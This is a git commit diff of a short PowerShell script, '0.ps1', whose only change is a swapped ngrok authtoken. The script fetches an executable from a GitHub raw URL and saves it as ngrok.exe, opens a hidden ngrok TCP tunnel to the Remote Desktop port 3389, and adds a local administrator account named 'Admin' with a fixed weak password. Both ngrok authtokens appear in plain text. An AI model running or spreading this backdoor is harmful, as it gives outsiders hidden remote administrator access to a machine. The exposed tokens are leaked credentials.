0c87b4bac715403520f9991a18acccf94c79ec26
n0td1n0kh0a <152876934+n0td1n0kh0a@users.noreply.github.com>
2024-04-29 14:41:43 +0700

    Update 0.ps1

--- 0.ps1
+++ 0.ps1
@@ -1,5 +1,5 @@
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/dinowo/main/use.exe" -OutFile ngrok.exe 
-cmd /c ngrok.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+cmd /c ngrok.exe authtoken 2flX2UiFtcfDHTJ6gRNRnE2J44j_3EbFaYe88nAbW2rSwgb1Y
 Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
